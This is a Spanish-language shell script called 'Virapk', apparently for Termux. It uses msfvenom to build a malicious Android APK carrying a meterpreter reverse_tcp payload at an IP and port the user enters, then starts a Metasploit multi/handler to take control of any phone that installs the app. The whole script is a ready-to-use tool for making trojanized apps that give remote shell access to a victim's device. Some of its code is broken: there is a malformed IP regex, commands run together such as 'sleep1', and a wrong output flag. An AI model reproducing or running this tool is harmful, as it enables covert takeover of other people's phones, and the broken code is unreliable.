#!/system/bin/sh
clear
echo -e "\e[31m"
figlet "                Virapk"
echo ""
read -p "Decime tu nombre porfavor ==> " saludo
clear
figlet "                 Bienvenido   "
figlet "                  $saludo     "
# Funcion para verificar instalacion de metasploit
if command -v msfconsole &>/dev/null; then
echo "Metasploit esta instalado en tu sistema."
else
echo "Metasploit no esta instalado en tu sistema."
echo "Preparando instalacion..."
bash metasploit.sh
fi
# Funcion para validar la IP
validate_ip() {
local ip=$1
if [[ $ip =~ ^[0-9]+\.[0-9]+[0-9]+[0-9]+$ ]]; then
return 0 # IP valida
else
return 1 # IP invalida
fi
}
sleep 1
# Funcion para validar el puerto
validate_port() {
local port=$1
if [[$port =~ ^[0-9]+$ && $port -ge 1 && $port -le 65535 ]]; then
return 0 # Puerto valido
else
return 1 # Puerto invalido
fi
}
sleep1
#Solicitar y validar la IP
while true; do
read -p "Ingrese la IP por favor ==> " IP
if ! validate_ip "$IP"; then
echo "La IP ungresada no es valida. Por favor, ungrese una IP valida."
else
break
fi
done
sleep 1
# Solicitar y validar el puerto
while true; do
read -p "ingrese el puerto por favor ==> " PUERTO
if ! validate_port "$PUERTO"; then
echo "El puerto ingreasado no es valido. Por favor ingrese un puerto valido."
else
break
fi
done
sleep 1echo "IP y Puerto validos"

# Resto del script para generar el payload y ejecutar Metasploit
read -p "Nombre del Payload ==> " name
nombre="$name.apk" # Nombre del Payload
echo "Generando el Payload...."
msfvenom -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PUERTO -O $nombre
echo "Payload generado: $nombre"
echo "Iniciando msfconsole..."
sleep 1
# Ejecutar metasploit en modo batch
echo "use exploit/multi/handler" > msfcomandos.rc
echo "set PAYLOAD android/meterpreter/reverse_tcp" >> msfcomandos.rc
echo "set LHOST $IP" >> msfcomandos.rc
echo "set LPORT $PUERTO" >> msfcomandos.rc
echo "exploit -j" >> msfcomandos.rc
msfconsole -r msfcomandos.rc
{}
# Limpiar el archivo de comandos despues de su uso
rm msfcomandos.rc




































